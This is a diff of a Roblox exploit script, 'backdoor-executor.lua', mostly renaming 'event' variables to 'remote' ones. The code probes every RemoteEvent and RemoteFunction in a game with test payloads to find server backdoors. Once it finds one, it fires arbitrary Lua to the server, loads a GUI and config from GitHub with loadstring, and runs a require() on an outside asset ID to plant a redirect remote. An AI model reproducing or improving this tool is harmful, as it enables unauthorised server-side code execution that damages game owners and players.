@@ -9,8 +9,8 @@ local configRaw = (
 	else
 		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
 )
-local scannedEvents = table.create(0)
-local eventInfo = {
+local scannedRemotes = table.create(0)
+local remoteInfo = {
 	["foundBackdoor"] = false,
 	["instance"] = nil,
 	["args"] = {"source"},
@@ -18,10 +18,13 @@ local eventInfo = {
 	["srcFunc"] = nil
 }
 local msgOutputs = {
-	["attached"] = "\n Attached Event: %s\n Type: %s",
-	["printEvent"] = "\n Event: %s\n Type: %s",
 	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
 	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
+	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
+	["configCantLoad"] = "Local configuration cannot be loaded, overwriting.",
+	["attached"] = "\n Attached Remote: %s\n Type: %s",
+	["printRemote"] = "\n Remote: %s\n Type: %s",
+	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]"
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -41,6 +44,9 @@ local stringifiedTypes = {
 	end,
 	string = function(value)
 		return string.format("\"%s\"", value)
+	end,
+	number = function(value)
+		return string.format("%2.f", value)
 	end,
 	Ray = function(value)
 		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
@@ -71,7 +77,7 @@ local function isRemoteAllowed(object)
 	local objectPath = object:GetFullName()
 
 	if (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) or
-		table.find(scannedEvents, objectPath)
+		table.find(scannedRemotes, objectPath)
 	then
 		return false
 	end
@@ -111,7 +117,6 @@ local function getStringifiedType(value)
 	)
 end
 
-
 local function applyMacros(source)
 	for macroName, macroValue in config.scriptMacros do
 		macroValue = getStringifiedType(
@@ -120,12 +125,12 @@ local function applyMacros(source)
 			else
 				macroValue
 		)
-		source = string.gsub(source, "%" .. macroName .. "%", macroValue)
+		source = string.gsub(source, "%%" .. macroName .. "%%", macroValue)
 	end
 	return source
 end
 
-local function getEventFunc(object)
+local function getRemoteFunc(object)
 	return (
 		if object:IsA("RemoteEvent") then
 			object.FireServer
@@ -136,39 +141,45 @@ local function getEventFunc(object)
 end
 
 local function execScript(source)
-	if not eventInfo.foundBackdoor then return end
-	source = applyMacros(source)
-	local eventFunc = getEventFunc(eventInfo.instance)
-	eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)
+	if not remoteInfo.foundBackdoor then return end
+	local remoteFunc = getRemoteFunc(remoteInfo.instance)
+	remoteInfo.args[remoteInfo.argSrcIndex] = applyMacros(if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 
-	task.spawn(eventFunc, eventInfo.instance, unpack(eventInfo.args))
+	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteInfo.args))
 end
 
-local function initializeEventInfo(params)
-	if eventInfo.foundBackdoor then return end
+local function initializeRemoteInfo(params)
+	if remoteInfo.foundBackdoor then return end
 
-	eventInfo.foundBackdoor = true
+	remoteInfo.foundBackdoor = true
 	for name, value in params do
-		eventInfo[name] = value
+		remoteInfo[name] = value
 	end
 end
 
-local function onAttached(eventObj, params)
-	if not eventObj then return end
+local function onAttached(remoteObj, params)
+	if not remoteObj then return end
 	getgenv().__BACKDOOREXEATTACHED = true
-	print(string.format(msgOutputs.attached, eventObj:GetFullName(), eventObj.ClassName))
+	print(string.format(msgOutputs.attached, remoteObj:GetFullName(), remoteObj.ClassName))
 	sendNotification("Attached!")
-	initializeEventInfo(params or {
-		["instance"] = eventObj,
+	initializeRemoteInfo(params or {
+		["instance"] = remoteObj,
 	})
 
-	if config.redirectRemote then -- doesn't work
-		execScript("require(11906423264)(%userid%)")
-		local newRemote = game:GetService("ReplicatedStorage"):WaitForChild("bexe-remote")
-		eventInfo.instance = newRemote
+	if config.redirectRemote then
+		local newRemote = game:GetService("JointsService"):FindFirstChildWhichIsA("RemoteEvent")
+		if not (newRemote and newRemote:GetAttribute("bexeremote")) then
+			execScript("require(11906423264)(%userid%)")
+			newRemote = game:GetService("JointsService"):FindFirstChild("bexe-remote")
+		end
+
+		remoteInfo.instance = newRemote
+		remoteInfo.argSrcIndex = 1
+		remoteInfo.args = {"source"}
 	end
 
 	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
+		customMainTabText = msgOutputs.mainTabText,
 		customExecution = true,
 		executeFunc = execScript,
 	})
@@ -178,7 +189,7 @@ local function onAttached(eventObj, params)
 end
 
 local function findBackdoors()
-	if eventInfo.foundBackdoor then return end
+	if remoteInfo.foundBackdoor then return end
 	local connection do
 		connection = workspace.ChildAdded:Connect(function(object)
 			if object:IsA("StringValue") and
@@ -186,22 +197,22 @@ local function findBackdoors()
 				object.Value ~= ""
 			then
 				onAttached(pathToInstance(object.Value))
-				connection:Disconnect()
 			end
 		end)
 	end
 
 	for _, object in getRemotes() do
-		if eventInfo.foundBackdoor then break end
-		local eventFunc, objectPath = getEventFunc(object), object:GetFullName()
+		if remoteInfo.foundBackdoor then break end
+		local remoteFunc, objectPath = getRemoteFunc(object), object:GetFullName()
 
-		print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
-		pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))
+		print(string.format(msgOutputs.printRemote, object:GetFullName(), object.ClassName))
+		pcall(task.spawn, remoteFunc, object, string.format(testSource, objectPath))
 
-		table.insert(scannedEvents, objectPath)
+		table.insert(scannedRemotes, objectPath)
 		task.wait()
 	end
-	table.clear(scannedEvents)
+	table.clear(scannedRemotes)
+	connection:Disconnect()
 end
 -- main
 do -- "initialization"?
@@ -211,7 +222,7 @@ do -- "initialization"?
 		local succ, loadedConfig = pcall(loadstring(configRaw))
 
 		if (not succ) then
-			sendNotification("Local configuration cannot be loaded, overwriting.")
+			warn(msgOutputs.configCantLoad)
 			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
 
 			writefile("bexe-config.lua", configRaw)
@@ -229,16 +240,16 @@ do -- backdoor finding
 
 		if placeCacheData then
 			local successCount = 0
-			local eventObj = pathToInstance(placeCacheData.Path)
+			local remoteObj = pathToInstance(placeCacheData.Path)
 			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))
 
-			successCount += (if typeof(eventObj) == "Instance" then 1 else 0)
-			successCount += (if (successCount == 1 and (eventObj:IsA("RemoteEvent") or eventObj:IsA("RemoteFunction"))) then 1 else 0)
+			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
+			successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
 			successCount += (if argSrcIndex then 1 else 0)
 
 			if successCount >= 3 then
-				onAttached(eventObj, {
-					["instance"] = eventObj,
+				onAttached(remoteObj, {
+					["instance"] = remoteObj,
 					["srcFunc"] = placeCacheData.SourceFunc,
 					["args"] = placeCacheData.Args,
 					["argSrcIndex"] = argSrcIndex
@@ -247,13 +258,13 @@ do -- backdoor finding
 				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
 			end
 		end
-		if (not placeCacheData or not eventInfo.foundBackdoor) then -- scan first
+		if (not placeCacheData or not remoteInfo.foundBackdoor) then -- scan first
 			findBackdoors()
 		end
 
-		if not eventInfo.foundBackdoor then -- if no backdoor found
-			print("No backdoor(s) can be found here!")
-			sendNotification("No backdoor(s) can be found here!")
+		if not remoteInfo.foundBackdoor then -- if no backdoor found
+			print(msgOutputs.noBackdoorRemote)
+			sendNotification(msgOutputs.noBackdoorRemote)
 		end
 	else
 		sendNotification("Already attached!")
